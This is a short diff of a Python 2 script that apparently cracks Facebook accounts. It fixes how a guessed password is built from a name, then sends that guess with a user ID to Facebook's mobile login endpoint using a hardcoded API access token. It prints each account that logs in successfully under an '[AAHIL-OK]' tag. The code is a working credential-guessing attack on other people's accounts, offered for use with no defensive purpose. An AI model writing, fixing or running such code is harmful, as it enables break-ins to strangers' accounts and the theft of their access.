@@ -114,7 +114,7 @@ def nam():
                 cp.close()
                 cps.append(uid+pass1)
             else:
-                pass2 = first=pas1
+                pass2 = first+pas1
                 send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass2)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                 if "session_key" in send.text and "EAAA" in send.text:
                     print g + ("[AAHIL-OK] " +uid+ " | " +pass2)
